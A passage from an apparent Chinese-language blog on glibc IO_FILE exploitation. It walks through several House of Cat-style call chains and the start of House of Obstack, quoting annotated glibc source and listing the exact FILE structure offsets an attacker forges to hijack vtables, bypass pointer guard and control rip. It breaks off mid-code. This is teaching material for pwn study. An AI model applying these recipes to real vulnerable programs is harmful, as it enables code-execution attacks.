<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 需要进入这个分支</span></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">    <span class="comment">// 需要一路调用到这里</span></span><br><span class="line">      status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                   fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">                   &amp;read_stop,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">                   fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">                   &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">           <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而<code>_IO_wfile_underflow</code>又是<code>_IO_wfile_jumps</code>这个<code>_IO_jump_t</code>类型变量的成员函数。</p>
<p>因此可以劫持或者伪造<code>FILE</code>结构体的<code>fp-&gt;vtable</code>为<code>_IO_wfile_jumps</code>，<code>fp-&gt;_codecvt</code>为可控堆地址，当程序执行<code>IO</code>操作时，控制程序执行流走到<code>_IO_wfile_underflow</code>，设置好<code>fp-&gt;codecvt-&gt;__cd_in</code>结构体，使得最终调用到<code>__libio_codecvt_in</code>中的<code>DL_CALL_FCT</code>宏，伪造函数指针，进而控制程序执行流。</p>
<p>注意，在伪造过程中，可以设置<code>gs-&gt;__shlib_handle == NULL</code>，从而绕过<code>__pointer_guard</code>的指针调用保护。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/38d0b44c50e70fcfc5ee911fd5627d79.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="利用-IO-wfile-underflow-mmap函数控制程序执行流-1"><a href="#利用-IO-wfile-underflow-mmap函数控制程序执行流-1" class="headerlink" title="利用_IO_wfile_underflow_mmap函数控制程序执行流"></a>利用_IO_wfile_underflow_mmap函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~4</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps_mmap</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_underflow_mmap</code>即可</li>
<li><code>_IO_read_ptr &lt; _IO_read_end</code>，即满足<code>*(fp + 8) &lt; *(fp + 0x10)</code></li>
<li><code>_wide_data</code>保持默认，或者设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr &gt;= _wide_data-&gt;_IO_read_end</code>，即满足<code>*A &gt;= *(A + 8)</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为非<code>0</code>，即满足<code>*(A + 0x30) != 0</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_underflow_mmap</span><br><span class="line">    __libio_codecvt_in</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>看<code>_IO_wfile_underflow_mmap</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow_mmap (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *read_stop;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 不能进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &gt;= fp-&gt;_IO_read_end</span><br><span class="line">      <span class="comment">/* No.  But maybe the read buffer is not fully set up.  */</span></span><br><span class="line">      &amp;&amp; _IO_file_underflow_mmap (fp) == EOF)</span><br><span class="line">    <span class="comment">/* Nothing available.  _IO_file_underflow_mmap has set the EOF or error</span></span><br><span class="line"><span class="comment">       flags as appropriate.  */</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">  read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 最好不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span> (fp-&gt;_wide_data-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">      _IO_wdoallocbuf (fp);<span class="comment">// 需要走到这里</span></span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">  __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">              fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">              &amp;read_stop,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">              fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">              &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要设置<code>fp-&gt;_flags &amp; _IO_NO_READS == 0</code>，设置<code>fp-&gt;_wide_data-&gt;_IO_read_ptr &gt;= fp-&gt;_wide_data-&gt;_IO_read_end</code>，设置<code>fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end</code>不进入调用，设置<code>fp-&gt;_wide_data-&gt;_IO_buf_base != NULL</code>不进入调用。</p>
<h3 id="利用-IO-wdo-write函数控制程序执行流"><a href="#利用-IO-wdo-write函数控制程序执行流" class="headerlink" title="利用_IO_wdo_write函数控制程序执行流"></a>利用_IO_wdo_write函数控制程序执行流</h3><p><code>_IO_wdo_write</code>的调用点很多，这里我选择一个相对简单的链：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_sync</span><br><span class="line">    _IO_do_flush</span><br><span class="line">      _IO_wdo_write</span><br></pre></td></tr></table></figure></div>

<p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>vtable</code>设置为<code>_IO_file_jumps/</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可</li>
<li><code>_IO_write_ptr &gt; _IO_write_base</code>，即满足<code>*(fp + 0x28) &gt; *(fp + 0x20)</code></li>
<li><code>_mode &gt; 0</code>，即满足<code>(fp + 0xc0) &gt; 0</code></li>
<li><code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code></li>
<li><code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt;= *(A + 0x18)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_out.step</code>设置为可控堆地址<code>C</code>，即满足<code>*(B + 0x38) = C</code></li>
<li><code>codecvt-&gt;__cd_out.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_out.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_new_file_sync</span><br><span class="line">    _IO_do_flush</span><br><span class="line">        _IO_wdo_write</span><br><span class="line">          __libio_codecvt_out</span><br><span class="line">              DL_CALL_FCT</span><br><span class="line">                  gs = fp-&gt;_codecvt-&gt;__cd_out.step</span><br><span class="line">                  *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>首先看<code>_IO_new_file_sync</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">int</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;<span class="comment">//调用到这里</span></span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>只需要满足<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>。</p>
<p>然后看<code>_IO_do_flush</code>宏：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0                                  \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span></span><br><span class="line"><span class="meta">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \</span></span><br><span class="line"><span class="meta">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure></div>

<p>根据<code>fp-&gt;_mode</code>的值选择调用<code>_IO_do_write</code>或者<code>_IO_wdo_write</code>。这里我们要调用后者，必须使<code>fp-&gt;_mode &gt; 0</code>。此时的第二个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_base</code>，第三个参数为<code>fp-&gt;_wide_data-&gt;_IO_write_ptr - fp-&gt;_wide_data-&gt;_IO_write_base</code>。</p>
<p>接着看<code>_IO_wdo_write</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_wdo_write (FILE *fp, <span class="type">const</span> <span class="type">wchar_t</span> *data, <span class="type">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 第三个参数必须要大于0</span></span><br><span class="line">  <span class="keyword">if</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr</span><br><span class="line">      &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;<span class="comment">// 不能进入这个分支</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_new_do_write (fp, fp-&gt;_IO_write_base,</span><br><span class="line">                fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)</span><br><span class="line">        <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now convert from the internal format into the external buffer.  */</span></span><br><span class="line">    <span class="comment">// 需要调用到这里</span></span><br><span class="line">      result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                    data, data + to_do, &amp;new_data,</span><br><span class="line">                    write_ptr,</span><br><span class="line">                    buf_end,</span><br><span class="line">                    &amp;write_ptr);</span><br><span class="line">          <span class="comment">//......</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先<code>to_do</code>必须要大于<code>0</code>，即满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>，然后这个判断需要为假<code>fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base</code>。</p>
<p>这个链基本需要控制<code>fp-&gt;_wide_data</code>，相比上两条链的约束条件要更多一点。</p>
<h3 id="使用-IO-wfile-sync函数控制程序执行流"><a href="#使用-IO-wfile-sync函数控制程序执行流" class="headerlink" title="使用_IO_wfile_sync函数控制程序执行流"></a>使用_IO_wfile_sync函数控制程序执行流</h3><p>对<code>fp</code>的设置如下：</p>
<ul>
<li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可</li>
<li><code>_wide_data</code>设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code></li>
<li><code>_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</code>，即满足<code>*A != *(A + 8)</code></li>
<li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li>
<li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li>
<li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控。</li>
</ul>
<p>函数的调用链如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_wfile_sync</span><br><span class="line">    __libio_codecvt_length</span><br><span class="line">        DL_CALL_FCT</span><br><span class="line">            gs = fp-&gt;_codecvt-&gt;__cd_in.step</span><br><span class="line">            *(gs-&gt;__fct)(gs)</span><br></pre></td></tr></table></figure></div>

<p>详细分析如下：<br>直接看<code>_IO_wfile_sync</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="comment">// 不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  <span class="comment">// 需要进入到这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment">     external buffer.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">      <span class="type">off64_t</span> new_pos;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 这里直接返回-1即可</span></span><br><span class="line">      <span class="type">int</span> clen = __libio_codecvt_encoding (cv);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">       wide character.  */</span></span><br><span class="line">    delta *= clen;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">         To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">         generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">         position.  */</span></span><br><span class="line">      <span class="type">int</span> nread;</span><br><span class="line">      <span class="type">size_t</span> wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr</span><br><span class="line">               - fp-&gt;_wide_data-&gt;_IO_read_base);</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">    <span class="comment">// 调用到这里</span></span><br><span class="line">      nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                      fp-&gt;_IO_read_base,</span><br><span class="line">                      fp-&gt;_IO_read_end, wnread);</span><br><span class="line">            <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base</code>和<code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0</code>。</p>
<p>然后看下<code>__libio_codecvt_encoding</code>函数：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libio_codecvt_encoding (<span class="keyword">struct</span> _IO_codecvt *codecvt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* See whether the encoding is stateful.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__stateful)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">/* Fortunately not.  Now determine the input bytes for the conversion</span></span><br><span class="line"><span class="comment">     necessary for each wide character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__min_needed_from</span><br><span class="line">      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)</span><br><span class="line">    <span class="comment">/* Not a constant value.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> codecvt-&gt;__cd_in.step-&gt;__min_needed_from;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>直接设置<code>fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0</code>即可返回<code>-1</code>。</p>
<h2 id="House-of-琴瑟琵琶-House-of-Obstack"><a href="#House-of-琴瑟琵琶-House-of-Obstack" class="headerlink" title="House of 琴瑟琵琶 | House of Obstack"></a>House of 琴瑟琵琶 | House of Obstack</h2><p>这个攻击手段主要是利用<code>_IO_obstack_jumps</code>，其中<code>_IO_obstack_overflow</code>和 <code>_IO_obstack_xsputn</code> 都可以触发，攻击链如下。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_obstack_overflow</span><br><span class="line">        <span class="title function_">obstack_1grow</span> <span class="params">(obstack, c)</span>;</span><br><span class="line">                _obstack_newchunk (__o, <span class="number">1</span>);   </span><br><span class="line">                         new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">                                     (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_obstack_xsputn</span><br><span class="line">        <span class="title function_">obstack_grow</span> <span class="params">(obstack, data, n)</span>;;</span><br><span class="line">                _obstack_newchunk (__o, __len);</span><br><span class="line">                         new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">                                     (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</span><br></pre></td></tr></table></figure></div>

<p>但实际过程中<code>_IO_obstack_overflow</code>容易触发<code>assert (c != EOF);</code> ，所以一般选择第二条链。</p>
<p><code>_IO_obstack_jumps</code>中只有2个函数有赋值，其他都为空。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>_IO_obstack_overflow</code>和<code>_IO_obstack_xsputn</code>两个函数内容如下。为了避免绕过<code>_IO_obstack_overflow</code>中的<code>assert (c != EOF);</code> ，<strong>我们一般用<code>_IO_obstack_xsputn</code>。</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> _IO_obstack_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);  <span class="comment">// 此处不可控</span></span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  obstack_blank_fast (obstack, 